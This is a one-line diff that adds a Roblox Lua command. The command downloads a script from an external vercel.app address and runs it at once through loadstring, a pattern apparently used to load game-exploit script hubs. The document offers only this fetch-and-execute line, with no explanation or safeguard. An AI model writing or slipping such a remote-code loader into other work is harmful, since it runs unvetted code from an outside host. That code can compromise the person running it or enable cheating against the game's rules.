@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://estella.vercel.app/loader.lua',true))()
